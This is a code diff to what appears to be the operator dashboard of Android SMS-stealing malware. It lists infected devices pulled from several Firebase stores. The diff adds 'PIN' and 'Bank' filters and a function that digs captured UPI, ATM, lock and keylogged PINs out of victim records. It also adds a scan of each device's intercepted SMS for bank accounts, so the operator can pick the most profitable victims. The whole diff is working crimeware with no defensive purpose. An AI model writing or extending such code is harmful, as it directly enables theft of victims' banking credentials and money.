@@ -186,6 +186,10 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 .search{width:100%;padding:12px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:14px;outline:none}
 .search:focus{border-color:var(--accent)}
 
+.filter-row{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
+.filter-chip{padding:10px 14px;border-radius:12px;border:1px solid var(--border);background:var(--card);color:var(--text);font-size:12px;font-weight:700;cursor:pointer;font-family:'Syne',sans-serif}
+.filter-chip.active{border-color:var(--accent);background:rgba(255,60,60,0.12);color:var(--accent)}
+
 /* DEVICE CARDS */
 .dev-card{display:flex;gap:12px;padding:14px;margin-bottom:10px;border-radius:16px;background:var(--card);border:1px solid var(--border);cursor:pointer;transition:transform .15s ease,border-color .15s}
 .dev-card:active{transform:scale(0.98)}
@@ -315,6 +319,11 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
         <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
       </div>
       <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
+      <div class="filter-row">
+        <button type="button" class="filter-chip active" data-filter="all" onclick="setDevFilter('all',this)">All</button>
+        <button type="button" class="filter-chip" data-filter="pin" onclick="setDevFilter('pin',this)">🔐 PIN</button>
+        <button type="button" class="filter-chip" data-filter="bank" onclick="setDevFilter('bank',this)">🏦 Bank</button>
+      </div>
       <div id="devList"></div>
     </section>
 
@@ -395,6 +404,7 @@ var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var firebaseConfigUpdated=0;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
+var devFilterMode='all', deviceBankCache={};
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
@@ -436,7 +446,62 @@ function makeDevKey(fbId,devId){return fbId+'::'+devId;}
 function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
 function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
-function getFilteredDevs(){return allDevs;}
+function extractPinFromRecord(raw){
+  if(!raw||typeof raw!=='object')return '';
+  var keys=['pin','PIN','device_pin','devicePin','mpin','MPIN','upi_pin','upiPin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
+  var check=function(obj){
+    if(!obj||typeof obj!=='object')return '';
+    var i,v,s;
+    for(i=0;i<keys.length;i++){
+      v=obj[keys[i]];
+      if(v==null)continue;
+      s=String(v).trim();
+      if(s&&s!=='0'&&s!=='null'&&s!=='undefined')return s;
+    }
+    return '';
+  };
+  var p=check(raw), nests=['device_info','live_data','deviceInfo','liveData','data','info','captured','keylog','key_log','upi','bank','credentials'], i, j, k, v, s;
+  if(p)return p;
+  for(i=0;i<nests.length;i++){if(raw[nests[i]]){p=check(raw[nests[i]]);if(p)return p;}}
+  function deepScan(obj,depth){
+    if(!obj||typeof obj!=='object'||depth>4)return '';
+    for(k in obj){
+      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
+      v=obj[k];
+      if(/pin/i.test(k)&&v!=null){
+        s=String(v).trim();
+        if(s&&s!=='0'&&s!=='null'&&/^\d{4,8}$/.test(s))return s;
+      }
+      if(v&&typeof v==='object'){s=deepScan(v,depth+1);if(s)return s;}
+    }
+    return '';
+  }
+  return deepScan(raw,0);
+}
+function deviceHasPin(d){
+  var raw=clientsRawMap[d.id];
+  return !!(d.pin||extractPinFromRecord(raw));
+}
+function getFilteredDevs(){
+  var list=allDevs;
+  if(devFilterMode==='pin')list=list.filter(deviceHasPin);
+  else if(devFilterMode==='bank')list=list.filter(function(d){return deviceBankCache[d.id]===true;});
+  return list;
+}
+function setDevFilter(mode,btn){
+  devFilterMode=mode||'all';
+  document.querySelectorAll('.filter-chip').forEach(function(el){el.classList.remove('active');});
+  if(btn)btn.classList.add('active');
+  if(mode==='bank'){
+    var pending=allDevs.some(function(d){return deviceBankCache[d.id]===undefined;});
+    if(pending){
+      toast('Bank SMS scan ho raha hai...',true);
+      scanAllDevicesBank().then(function(){renderDevices();updateStats();});
+      return;
+    }
+  }
+  renderDevices();updateStats();
+}
 function fetchFirebaseConfigsFromServer(){
   return fetch(FIREBASE_API_URL,{cache:'no-store'}).then(function(r){
     if(!r.ok)throw new Error('Firebase API failed');
@@ -596,7 +661,7 @@ function processClientsData(){
     allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
       name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
       status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,
-      sims:extractDeviceSims(s)});
+      sims:extractDeviceSims(s),pin:extractPinFromRecord(s),hasPin:!!extractPinFromRecord(s)});
   });
   allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
   if(!selDev&&allDevs.length)selDev=allDevs[0].id;
@@ -649,17 +714,38 @@ function fetchAllData(){
 }
 function refreshData(){toast('Refreshing...',true);fetchAllData();}
 
+function scanDeviceBankStatus(d){
+  if(deviceBankCache[d.id]!==undefined)return Promise.resolve(deviceBankCache[d.id]);
+  var inst=getFbInstance(d.fbId);
+  if(!inst){deviceBankCache[d.id]=false;return Promise.resolve(false);}
+  return fetchSmsFromPaths(inst,d).then(function(list){
+    var has=parseBankAccountsFromSms(list).length>0;
+    deviceBankCache[d.id]=has;
+    return has;
+  }).catch(function(){deviceBankCache[d.id]=false;return false;});
+}
+function scanAllDevicesBank(){
+  if(!allDevs.length)return Promise.resolve();
+  return Promise.all(allDevs.map(scanDeviceBankStatus));
+}
+
 function renderDevices(){
   var q=(document.getElementById('devSearch').value||'').toLowerCase();
-  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
+  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId+(d.pin||'')).toLowerCase().includes(q);});
   var el=document.getElementById('devList');
-  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
+  if(!list.length){
+    var msg=devFilterMode==='pin'?'No PIN clients found':devFilterMode==='bank'?'No bank account clients yet — wait for scan':'No devices yet';
+    el.innerHTML='<div class="empty-state"><div class="ico">'+(devFilterMode==='pin'?'🔐':devFilterMode==='bank'?'🏦':'📡')+'</div>'+msg+'<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';
+    return;
+  }
   el.innerHTML=list.map(function(d){
+    var pinChip=d.pin?'<span class="chip bat">PIN '+esc(d.pin)+'</span>':'';
+    var bankChip=deviceBankCache[d.id]===true?'<span class="chip fb">🏦 Bank</span>':'';
     return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
       '<div class="dev-bar"></div><div class="dev-body">'+
       '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
       '<div class="dev-meta">'+esc(d.name)+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
-      '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
+      '<div class="dev-chips">'+pinChip+bankChip+'<span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
       '</div></div>';
   }).join('');
 }
